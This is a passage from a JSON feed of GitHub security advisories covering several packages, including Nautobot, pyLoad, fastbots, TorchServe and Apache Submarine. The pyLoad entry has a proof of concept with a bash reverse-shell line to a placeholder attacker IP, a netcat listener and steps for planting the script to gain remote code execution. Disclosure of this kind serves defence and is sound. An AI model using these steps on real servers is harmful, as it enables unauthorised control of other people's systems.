            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All users of Nautobot versions earlier than 1.6.6 or 2.0.5 are potentially affected.</p>\n<p>Due to incorrect usage of Django's <code>mark_safe()</code> API when rendering certain types of user-authored content, including:</p>\n<ul>\n<li>custom links</li>\n<li>job buttons</li>\n<li>computed fields</li>\n</ul>\n<p>it is possible that users with permission to create or edit these types of content could craft a malicious payload (such as JavaScript code) that would be executed when rendering pages containing this content.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>We have fixed the incorrect uses of <code>mark_safe()</code> (generally by replacing them with appropriate use of <code>format_html()</code> instead) to prevent such malicious data from being executed.</p>\n<p>Users on Nautobot 1.6.x LTM should upgrade to v1.6.6 and users on Nautobot 2.0.x should upgrade to v2.0.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>Appropriate object permissions can and should be applied to restrict which users are permitted to create or edit the aforementioned types of user-authored content. Other than that, there is no direct fix available.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4832\">https://github.com/nautobot/nautobot/pull/4832</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4833\">https://github.com/nautobot/nautobot/pull/4833</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr\">https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48705\">https://nvd.nist.gov/vuln/detail/CVE-2023-48705</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4832\">https://github.com/nautobot/nautobot/pull/4832</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4833\">https://github.com/nautobot/nautobot/pull/4833</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2\">https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d\">https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe\">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cf9f-wmhp-v4pr\">https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cf9f-wmhp-v4pr",
            "title": "[nautobot] Cross-site Scripting potential in custom links, job buttons, and computed fields",
            "date_modified": "2023-11-22T20:55:55.000Z",
            "date_published": "2023-11-22T20:55:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cf9f-wmhp-v4pr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When credentials are provided while creating an OnboardingTask they may be visible via the Job Results view under the Additional Data tab as args for the Celery Task execution. This only applies to OnboardingTasks that are created with credentials specified while on v2.0.0-2.0.2 of Nautobot Device Onboarding. This advisory does not apply earlier version or when using NAPALM_USERNAME &amp; NAPALM_PASSWORD from nautobot_config.py</p>\n<h3 id=\"patches\">Patches</h3>\n<p>v3.0.0</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"recommendations\">Recommendations</h3>\n<ul>\n<li>Delete all Job Results for any onboarding task to remove clear text credentials from database entries that were run while on v2.0.X</li>\n<li>Upgrade to v3.0.0</li>\n<li>Rotate any exposed credential</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot-plugin-device-onboarding/security/advisories/GHSA-qf3c-rw9f-jh7v\">https://github.com/nautobot/nautobot-plugin-device-onboarding/security/advisories/GHSA-qf3c-rw9f-jh7v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48700\">https://nvd.nist.gov/vuln/detail/CVE-2023-48700</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qf3c-rw9f-jh7v\">https://github.com/advisories/GHSA-qf3c-rw9f-jh7v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qf3c-rw9f-jh7v",
            "title": "[nautobot-device-onboarding] Clear Text Credentials Exposed via Onboarding Task",
            "date_modified": "2023-11-27T15:25:14.000Z",
            "date_published": "2023-11-21T23:50:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qf3c-rw9f-jh7v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A web UI user can store files anywhere on the pyLoad server and gain command execution by abusing scripts.</p>\n<h3 id=\"details\">Details</h3>\n<p>When a user creates a new package, a subdirectory is created within the /downloads folder to store files. This new directory name is derived from the package name, except a filter is applied to make sure it can't traverse directories and stays within /downloads.</p>\n<p>src/pyload/core/api/<strong>init</strong>.py::add_package::L432</p>\n<pre><code class=\"language-python\">  folder = (\n      folder.replace(\"http://\", \"\")\n      .replace(\"https://\", \"\")\n      .replace(\":\", \"\")\n      .replace(\"/\", \"_\")\n      .replace(\"\\\\\", \"_\")\n  )\n</code></pre>\n<p>So if a package were created with the name <code>\"../\"</code> the application would instead create the folder <code>\"/downloads/.._/\"</code></p>\n<p>However, when editing packages there is no prevention in place and a user can just pick any arbitrary directory in the filesystem.</p>\n<p>src/pyload/webui/app/blueprints/json_blueprint.py::edit_package::L195</p>\n<pre><code class=\"language-python\">  id = int(flask.request.form[\"pack_id\"])\n  data = {\n      \"name\": flask.request.form[\"pack_name\"],\n      \"_folder\": flask.request.form[\"pack_folder\"],\n      \"password\": flask.request.form[\"pack_pws\"],\n  }\n\n  api.set_package_data(id, data)\n</code></pre>\n<h3 id=\"steps-to-reproduce\">Steps to reproduce</h3>\n<ol>\n<li>Login to a pyLoad instance</li>\n<li>Go to \"Queue\" and create a new package with any name and a valid link</li>\n<li>Click \"Edit Package\" on the newly created package and set the folder as \"/config/scripts/download_finished/\"</li>\n<li>Restart the package </li>\n<li>Check the server filesystem and note the link was downloaded and stored inside \"/config/scripts/download_finished/\"</li>\n</ol>\n<h3 id=\"remote-code-execution-proof-of-concept\">Remote code execution proof-of-concept</h3>\n<p>It is possible to use this issue to abuse scripts and gain remote control over the pyLoad server.</p>\n<h4 id=\"on-attacker-machine\">On attacker machine</h4>\n<ol>\n<li>Start a web server hosting a malicious script</li>\n</ol>\n<pre><code class=\"language-bash\">echo -e '#!/bin/bash\\nbash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/9999 0&gt;&amp;1' &gt; evil.sh&amp;1\nsudo python3 -m http.server 80\n</code></pre>\n<ol start=\"2\">\n<li>Start netcat listener for reverse shells</li>\n</ol>\n<pre><code class=\"language-bash\">nc -vklp 9999\n</code></pre>\n<h4 id=\"on-pyload\">On pyLoad</h4>\n<ol>\n<li><p>Change pyLoad file permission settings</p>\n<p> Change permissions of downloads: On\n Permission mode for downloaded files: 0744</p>\n</li>\n<li><p>Create a package with link pointing to the attacker</p>\n<p> http:///evil.sh</p>\n</li>\n<li><p>Edit package and change folder to /config/scripts/package_deleted/</p>\n</li>\n<li><p>Refresh package. Wait up to 60 seconds for scripts to be processed by pyLoad</p>\n</li>\n<li><p>Delete any package package to trigger the script</p>\n</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>An authenticated user can gain control over the underlying pyLoad server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2\">https://github.com/pyload/pyload/security/advisories/GHSA-h73m-pcfw-25h2</a></li>\n<li><a href=\"https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f\">https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h73m-pcfw-25h2\">https://github.com/advisories/GHSA-h73m-pcfw-25h2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h73m-pcfw-25h2",
            "title": "[pyload-ng] Download to arbitrary folder can lead to RCE",
            "date_modified": "2023-11-21T22:19:12.000Z",
            "date_published": "2023-11-21T22:19:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h73m-pcfw-25h2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker could modify the locators.ini locator file with python code that without proper validation it's executed and it could lead to rce. The vulnerability is in the function def <strong>locator</strong>(self, locator_name: str) in page.py. The vulnerable code that load and execute directly from the file without validation it's:</p>\n<pre><code class=\"language-python\"> return eval(self._bot.locator(self._page_name, locator_name))\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>In order to mitigate this issue it's important to upgrade to fastbots version 0.1.5 or above. </p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806\">Merge that fix also this issue</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ubertidavide/fastbots/security/advisories/GHSA-vccg-f4gp-45x9\">https://github.com/ubertidavide/fastbots/security/advisories/GHSA-vccg-f4gp-45x9</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48699\">https://nvd.nist.gov/vuln/detail/CVE-2023-48699</a></li>\n<li><a href=\"https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806\">https://github.com/ubertidavide/fastbots/pull/3#issue-2003080806</a></li>\n<li><a href=\"https://github.com/ubertidavide/fastbots/commit/73eb03bd75365e112b39877e26ef52853f5e9f57\">https://github.com/ubertidavide/fastbots/commit/73eb03bd75365e112b39877e26ef52853f5e9f57</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vccg-f4gp-45x9\">https://github.com/advisories/GHSA-vccg-f4gp-45x9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vccg-f4gp-45x9",
            "title": "[fastbots] Eval Injection in fastbots",
            "date_modified": "2023-11-22T18:08:02.000Z",
            "date_published": "2023-11-21T22:18:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vccg-f4gp-45x9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Microsoft Common Data Model SDK Denial of Service Vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36566\">https://nvd.nist.gov/vuln/detail/CVE-2023-36566</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm2m-7hpw-fpmq\">https://github.com/advisories/GHSA-vm2m-7hpw-fpmq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm2m-7hpw-fpmq",
            "title": "[commondatamodel-objectmodel] Microsoft Common Data Model SDK Denial of Service Vulnerability",
            "date_modified": "2023-11-21T18:29:10.000Z",
            "date_published": "2023-10-10T18:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm2m-7hpw-fpmq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Using the model/workflow management API, there is a chance of uploading potentially harmful archives that contain files that are extracted to any location on the filesystem that is within the process permissions. Leveraging this issue could aid third-party actors in hiding harmful code in open-source/public models, which can be downloaded from the internet, and take advantage of machines running Torchserve.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The ZipSlip issue in TorchServe has been fixed by validating the paths of files contained within a zip archive before extracting them: <a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a></p>\n<p>TorchServe release 0.9.0 includes fixes to address the ZipSlip vulnerability:\n<a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a>\n<a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank Oligo Security for responsibly disclosing this issue.</p>\n<p>If you have any questions or comments about this advisory, we ask that you contact AWS Security via our <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">vulnerability reporting page</a> or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp\">https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp</a></li>\n<li><a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48299\">https://nvd.nist.gov/vuln/detail/CVE-2023-48299</a></li>\n<li><a href=\"https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb\">https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb</a></li>\n<li><a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m2mj-pr4f-h9jp\">https://github.com/advisories/GHSA-m2mj-pr4f-h9jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m2mj-pr4f-h9jp",
            "title": "[torchserve] TorchServe ZipSlip",
            "date_modified": "2023-11-21T21:33:50.000Z",
            "date_published": "2023-11-21T01:40:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m2mj-pr4f-h9jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Software Foundation Apache Submarine has a bug when serializing against yaml. The bug is caused by snakeyaml  <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-1471\">https://nvd.nist.gov/vuln/detail/CVE-2022-1471</a> .</p>\n<p>Apache Submarine uses JAXRS to define REST endpoints.  In order to\nhandle YAML requests (using application/yaml content-type), it defines\na YamlEntityProvider entity provider that will process all incoming\nYAML requests.  In order to unmarshal the request, the readFrom method\nis invoked, passing the entityStream containing the user-supplied data in <code>submarine-server/server-core/src/main/java/org/apache/submarine/server/utils/YamlUtils.java</code>.</p>\n<p>We have now fixed this issue in the new version by replacing to <code>jackson-dataformat-yaml</code>.\nThis issue affects Apache Submarine: from 0.7.0 before 0.8.0.&nbsp;Users are recommended to upgrade to version 0.8.0, which fixes this issue.\nIf using the version smaller than 0.8.0  and not want to upgrade, you can try cherry-pick PR  <a href=\"https://github.com/apache/submarine/pull/1054\">https://github.com/apache/submarine/pull/1054</a>  and rebuild the submart-server image to fix this.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46302\">https://nvd.nist.gov/vuln/detail/CVE-2023-46302</a></li>\n<li><a href=\"https://github.com/apache/submarine/pull/1054\">https://github.com/apache/submarine/pull/1054</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/SUBMARINE-1371\">https://issues.apache.org/jira/browse/SUBMARINE-1371</a></li>\n<li><a href=\"https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5\">https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8hcr-5x2g-9f7j\">https://github.com/advisories/GHSA-8hcr-5x2g-9f7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8hcr-5x2g-9f7j",
            "title": "[apache-submarine] Deserialization of Untrusted Data in apache-submarine",
            "date_modified": "2023-11-20T23:26:48.000Z",
            "date_published": "2023-11-20T09:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8hcr-5x2g-9f7j"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}